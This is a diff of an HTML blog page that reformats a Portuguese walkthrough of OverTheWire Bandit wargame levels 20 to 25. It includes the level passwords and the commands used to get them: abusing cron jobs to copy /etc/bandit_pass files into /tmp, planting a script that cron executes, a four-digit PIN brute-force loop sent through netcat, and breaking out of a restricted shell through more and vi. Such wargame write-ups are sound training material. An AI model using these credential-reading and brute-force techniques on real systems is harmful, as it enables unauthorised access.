@@ -331,103 +331,98 @@ Seguindo o enunciado, teoricamente você deveria abrir um listener com netcat, p
 
 
 <p>Depois abrir outra sessão ssh, executar</p>
-<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>./suconnect 12345```
-
-
-Então, voltar ao primeiro terminal e submeter a key via listener, para que o suconnect enviasse a resposta de volta  
-
-Muito trabalho, não?  
-Aqui o negócio é simples.
+<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>./suconnect 12345
 </pre></div>
 
 
-<p>(sleep 10; echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j) | nc -l 12345 &amp;
+<p>Então, voltar ao primeiro terminal e submeter a key via listener, para que o suconnect enviasse a resposta de volta  </p>
+<p>Muito trabalho, não?<br />
+Aqui o negócio é simples.</p>
+<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>(sleep 10; echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j) | nc -l 12345 &amp;
 [1] 8230
 ./suconnect 12345
 Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
 Password matches, sending next password
-gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr</p>
-<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>Deu pra entender? Na primeira linha abrimos o netcat escutando na porta 12345 e enviamos via pipe pra ele o comando agrupado entre parenteses para aguardar 10 segundos e depois enviar a key, já enviando tudo para background com o &amp; no final.  
-Depois disso, é só digitar o ./suconnect 12345 em menos de 10 segundos e aguardar o tempo setado que a senha vai aparecer facilmente pra você!
-
-##Level 21
-
-Dentro da pasta /etc/cron.d/ tem vários cronjobs de vários usuários. Nosso próximo level é o 22, nele que devemos focar.
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
 </pre></div>
 
 
-<p>cat /etc/cron.d/cronjob_bandit22
-<em> * </em> * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
-cat /usr/bin/cronjob_bandit22.sh</p>
-<h1>!/bin/bash</h1>
-<p>chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
-cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv</p>
-<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>Analisando o código, você pode ver que a senha do bandit22 está sendo enviada para aquele arquivo de nome estranho no /tmp  
-É só dar um cat nele!
+<p>Deu pra entender? Na primeira linha abrimos o netcat escutando na porta 12345 e enviamos via pipe pra ele o comando agrupado entre parenteses para aguardar 10 segundos e depois enviar a key, já enviando tudo para background com o &amp; no final.<br />
+Depois disso, é só digitar o ./suconnect 12345 em menos de 10 segundos e aguardar o tempo setado que a senha vai aparecer facilmente pra você!</p>
+<h2>Level 21</h2>
+<p>Dentro da pasta /etc/cron.d/ tem vários cronjobs de vários usuários. Nosso próximo level é o 22, nele que devemos focar.</p>
+<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>cat /etc/cron.d/cronjob_bandit22
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
+cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 </pre></div>
 
 
-<p>cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
-Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI</p>
-<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>##Level 22
-
-O início é igual ao level 21\. Você deve verificar o cronjob do bandit23.
+<p>Analisando o código, você pode ver que a senha do bandit22 está sendo enviada para aquele arquivo de nome estranho no /tmp<br />
+É só dar um cat nele!</p>
+<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 </pre></div>
 
 
-<h1>!/bin/bash</h1>
-<p>myname=$(whoami)
-mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)</p>
-<p>echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"</p>
-<p>cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget</p>
-<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>Um poquinho de leitura de código resolve seu trabalho:
+<h2>Level 22</h2>
+<p>O início é igual ao level 21. Você deve verificar o cronjob do bandit23.</p>
+<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span><span style="color: #999999; font-style: italic">#!/bin/bash</span>
+
+<span style="color: #40ffff">myname</span><span style="color: #d0d0d0">=</span><span style="color: #6ab825; font-weight: bold">$(</span>whoami<span style="color: #6ab825; font-weight: bold">)</span>
+<span style="color: #40ffff">mytarget</span><span style="color: #d0d0d0">=</span><span style="color: #6ab825; font-weight: bold">$(</span><span style="color: #24909d">echo</span> I am user <span style="color: #40ffff">$myname</span> <span style="color: #d0d0d0">|</span> md5sum <span style="color: #d0d0d0">|</span> cut -d <span style="color: #ed9d13">&#39; &#39;</span> -f 1<span style="color: #6ab825; font-weight: bold">)</span>
+
+<span style="color: #24909d">echo</span> <span style="color: #ed9d13">&quot;Copying passwordfile /etc/bandit_pass/</span><span style="color: #40ffff">$myname</span><span style="color: #ed9d13"> to /tmp/</span><span style="color: #40ffff">$mytarget</span><span style="color: #ed9d13">&quot;</span>
+
+cat /etc/bandit_pass/<span style="color: #40ffff">$myname</span> &gt; /tmp/<span style="color: #40ffff">$mytarget</span>
 </pre></div>
 
 
-<p>myname=bandit23
-cat /tmp/$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
-jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n</p>
-<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>##Level 23
-
-Mesma coisa no início, olho no cronjobs_bandit24.  
-Você pode ver no script que ele executa que ele procura arquivos em uma determinada pasta e executa tudo que estiver la a todo minuto  
-Então é simples!
+<p>Um poquinho de leitura de código resolve seu trabalho:</p>
+<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>myname=bandit23
+cat /tmp/$(echo I am user $myname | md5sum | cut -d &#39; &#39; -f 1)
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 </pre></div>
 
 
-<p>cd /var/spool/bandit24
-echo "cat /etc/bandit_pass/bandit24 &gt; /tmp/n00bsb.bandit24" &gt; script.sh
-chmod +x script.sh</p>
-<h1>agora basta esperar virar para o próximo minuto e</h1>
-<p>cat /tmp/n00bsb.bandit24
-UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</p>
-<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>##Level 24
-
-Brute Force!
+<h2>Level 23</h2>
+<p>Mesma coisa no início, olho no cronjobs_bandit24.<br />
+Você pode ver no script que ele executa que ele procura arquivos em uma determinada pasta e executa tudo que estiver la a todo minuto<br />
+Então é simples!</p>
+<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>cd /var/spool/bandit24
+echo &quot;cat /etc/bandit_pass/bandit24 &gt; /tmp/n00bsb.bandit24&quot; &gt; script.sh
+chmod +x script.sh
+# agora basta esperar virar para o próximo minuto e
+cat /tmp/n00bsb.bandit24
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 </pre></div>
 
 
-<p>for i in {0000..9999}; do
-   echo  "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"; done | netcat localhost 30002 | grep bandit25</p>
-<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>Dentro do loop geramos a lista com a senha do level 24 combinada com todas as combinações de 4 dígitos possíveis, e depois de pronta, jogamos essa lista via pipe pro netcat.  
-Pode ser preciso rodar o comando algumas vezes, porque aparentemente o daemon não aguenta a pressão, mas é só insistir duas ou três vezes q vai dar certo.
-
-##Level 25
-
-Essa eu apanhei muito. O shell do usuário bandit26 parece ser diferente, e é.  
-Para passar desse nível, você deve redimensionar seu terminal, conforme a imagem abaixo:  
-![Screenshot from 2016-03-16 16-01-04](http://n00bsb.rocks/wp-content/uploads/2016/03/Screenshot-from-2016-03-16-16-01-04-300x61.png)  
-Ao dar enter, você vai se deparar com um “more”  
-![Screenshot from 2016-03-16 16-01-40](http://n00bsb.rocks/wp-content/uploads/2016/03/Screenshot-from-2016-03-16-16-01-40-300x87.png)  
-O truque aqui é dar fallback do more para o vi!  
-Digite esc, depois **v**.  
-O arquivo será aberto no vi. Agora você só precisa digitar esc, e depois: **e: /etc/bandit_pass/bandit26** e enter.  
-O arquivo bandit26 aparecerá com a senha.
+<h2>Level 24</h2>
+<p>Brute Force!</p>
+<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>for i in {0000..9999}; do
+   echo  &quot;UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i&quot;; done | netcat localhost 30002 | grep bandit25
 </pre></div>
 
 
-<p>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
-```</p>
+<p>Dentro do loop geramos a lista com a senha do level 24 combinada com todas as combinações de 4 dígitos possíveis, e depois de pronta, jogamos essa lista via pipe pro netcat.<br />
+Pode ser preciso rodar o comando algumas vezes, porque aparentemente o daemon não aguenta a pressão, mas é só insistir duas ou três vezes q vai dar certo.</p>
+<h2>Level 25</h2>
+<p>Essa eu apanhei muito. O shell do usuário bandit26 parece ser diferente, e é.<br />
+Para passar desse nível, você deve redimensionar seu terminal, conforme a imagem abaixo:<br />
+<img alt="Screenshot from 2016-03-16 16-01-04" src="http://n00bsb.rocks/wp-content/uploads/2016/03/Screenshot-from-2016-03-16-16-01-04-300x61.png" /><br />
+Ao dar enter, você vai se deparar com um “more”<br />
+<img alt="Screenshot from 2016-03-16 16-01-40" src="http://n00bsb.rocks/wp-content/uploads/2016/03/Screenshot-from-2016-03-16-16-01-40-300x87.png" /><br />
+O truque aqui é dar fallback do more para o vi!<br />
+Digite esc, depois <strong>v</strong>.<br />
+O arquivo será aberto no vi. Agora você só precisa digitar esc, e depois: <strong>e: /etc/bandit_pass/bandit26</strong> e enter.<br />
+O arquivo bandit26 aparecerá com a senha.</p>
+<div class="codehilite" style="background: #202020"><pre style="line-height: 125%"><span></span>5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+</pre></div>
+
+
 <p>Como o level 27 ainda não existe, acabamos de bater o desafio BANDIT do Overthewire!!</p>
                 </div><!-- /.entry-content -->
         </article>
@@ -451,11 +446,11 @@ O arquivo bandit26 aparecerá com a senha.
 <li><a href="../../category/wargames.html">Wargames</a></li>
 
 <li class="nav-header"><h4></i>Tags</h4></li>
-<li class="tag-[<pelican.contents.Article object at 0x105814710>]"><a href="../../tag/ctf.html">#ctf</a></li>
-<li class="tag-[<pelican.contents.Article object at 0x10589fc50>, <pelican.contents.Article object at 0x1057dfb50>]"><a href="../../tag/overthewireorg.html">#overthewire.org</a></li>
-<li class="tag-[<pelican.contents.Article object at 0x105814710>]"><a href="../../tag/sctf.html">#sctf</a></li>
-<li class="tag-[<pelican.contents.Article object at 0x10589fc50>, <pelican.contents.Article object at 0x1057dfb50>]"><a href="../../tag/wargames.html">#wargames</a></li>
-<li class="tag-[<pelican.contents.Article object at 0x105814710>, <pelican.contents.Article object at 0x10589fc50>, <pelican.contents.Article object at 0x1057dfb50>]"><a href="../../tag/write-up.html">#write-up</a></li>
+<li class="tag-[<pelican.contents.Article object at 0x10dc9d7d0>]"><a href="../../tag/ctf.html">#ctf</a></li>
+<li class="tag-[<pelican.contents.Article object at 0x10ec45d50>, <pelican.contents.Article object at 0x10eb83b50>]"><a href="../../tag/overthewireorg.html">#overthewire.org</a></li>
+<li class="tag-[<pelican.contents.Article object at 0x10dc9d7d0>]"><a href="../../tag/sctf.html">#sctf</a></li>
+<li class="tag-[<pelican.contents.Article object at 0x10ec45d50>, <pelican.contents.Article object at 0x10eb83b50>]"><a href="../../tag/wargames.html">#wargames</a></li>
+<li class="tag-[<pelican.contents.Article object at 0x10dc9d7d0>, <pelican.contents.Article object at 0x10ec45d50>, <pelican.contents.Article object at 0x10eb83b50>]"><a href="../../tag/write-up.html">#write-up</a></li>
 
 </ul>        </div><!--/.well -->
       </div><!--/row-->
